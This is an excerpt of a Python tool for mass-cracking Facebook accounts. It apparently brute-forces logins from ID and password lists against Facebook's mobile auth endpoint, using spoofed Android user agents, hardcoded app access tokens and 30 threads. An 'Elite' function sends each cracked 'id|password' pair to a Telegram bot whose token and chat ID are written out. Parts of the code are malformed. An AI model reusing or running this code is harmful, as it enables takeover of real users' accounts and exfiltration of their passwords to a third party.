...
for xd in range(1000):
   ...
   def Elite(id,ps):
    try:
        token = "8649390751:AAFk4ZmOF3jy6-lielNpD4Sw6ALZ7v197xI"
        chatid = "1002704660985"
        ok_id =str(id+"|"+ps)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        qosi = {"chat_id": chatid, "text": ok_id}
        requests.get(url, qosi=qosi)
    except:
        pass
...
def f5():
    devices = [
        {"model": "CPH2421", "android": "13", "width": 1080, "height": 2400, "density": "2.75", "carrier": "Orange DZ"},
        {"model": "CPH2219", "android": "12", "width": 1080, "height": 2400, "density": "2.5", "carrier": "Mobilis"},
        {"model": "CPH2067", "android": "11", "width": 720, "height": 1600, "density": "2.0", "carrier": "Djezzy"},
        {"model": "CPH2385", "android": "13", "width": 1080, "height": 2400, "density": "3.0", "carrier": "Ooredoo"},
        {"model": "CPH2437", "android": "14", "width": 1080, "height": 2412, "density": "2.75", "carrier": "Free"}
    ]

    fb_versions = [
        {"FBAV": "439.0.0.36.115", "FBBV": "570558823"},
        {"FBAV": "434.0.0.30.101", "FBBV": "560988754"},
        {"FBAV": "426.1.0.37.120", "FBBV": "540012345"},
        {"FBAV": "420.0.0.29.64", "FBBV": "520784123"},
    ]

    d = random.choice(devices)
    fb = random.choice(fb_versions)

    user_agent = (
        f"[FBAN/FB4A;"
        f"FBAV/{fb['FBAV']};"
        f"FBBV/{fb['FBBV']};"
        f"FBDM/{{density={d['density']},width={d['width']},height={d['height']}}};"
        f"FBLC/en_US;"
        f"FBRV/100000000;"
        f"FBCR/{d['carrier']};"
        f"FBMF/OPPO;"
...
def linex():print(f'  {G}_________________________________________________________________')
#[ LOGO ]#
#------------------[  system logo   ]-------------------#        
def Trial(PF):
    global TrialExist
...
def menu():
            clear()        
            print(' \033[1;32m[\033[1;31m1\033[1;32m] File Cloning ')
            print(' \033[1;32m[\033[1;31m2\033[1;32m] Follow fb')
            print(' \033[1;32m[\033[1;31m3\033[1;32m] Exit ')
            dino()
            ...
            if xd in ['1','01']:
               ...
               # print(' \033[1;32m[\033[1;31m=\033[1;32m] TRY METHOD 1 & 3 FOR BEST RESULTS ')
                ...
                with tred(max_workers=30) as crack_submit:
                 ...
                 #   print("\033[1;30m[\033[1;31m~\033[1;30m] \033[1;31m[\033[1;92mON\033[1;97m/\033[1;91mOFF\033[1;93m] Airplane mode after 5 minutes ")
                    linex()
                    for user in fo:
                ...
                os.system('python LAZ.py') 
            elif xd in ['0','00']:
                exit(' Thanls For Your Use ')
            elif xd in ['2','02']:
                os.system('xdg-open https://www.facebook.com/Mr.rabah05')
            else:
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Davik/2.1.0 (Linux; U; Android 8.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/416.0.0.23.136;FBBV/610041804;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]';'[Davik/2.1.0 (Linux; U; Android 8.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/540.0.0.38.294;FBBV/877849859;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]';'Davik/2.1.0 (Linux; U; Android 13.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/902.0.0.76.714;FBBV/396132837;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]';'[Davik/2.1.0 (Linux; U; Android 7.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/180.0.0.93.209;FBBV/325028154;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]'.'[Davik/2.1.0 (Linux; U; Android 12.0.1; SM-A205YN Build/QP1A.190711.020; wv) [FBAN/FB4A;FBAV/319.0.0.95.998;FBBV/916690216;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A205YN;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]"
                                #ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973F Build/OPM1.171019.011) [FBAN/FB4A;FBAV/404.0.0.22.90;FBBV/00000000;FBDM/{density=440,width=720,height=1920};FBLC/ar_DZ;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 13; SM-G973F Build/TP1A.220624.014) [FBAN/FB4A;FBAV/390.0.0.34.101;FBBV/00000000;FBDM/{density=420,width=1440,height=1920};FBLC/en_US;FBRV/0]','Dalvik/2.1.0 (Linux; U; Android 12; Moto G(9) Power Build/SP1A.210812.015) [FBAN/FB4A;FBAV/399.1.0.29.93;FBBV/00000000;FBDM/{density=420,width=1080,height=2400};FBLC/es_ES;FBRV/0]"          
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                li = ['28']
                                li2 = random.choice(li)
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ..oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'1792792947455470|f43b4b4c85276992ac952012f8bba674'}
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ..oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'ar_MA','client_country_code': 'MA','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                                head = {
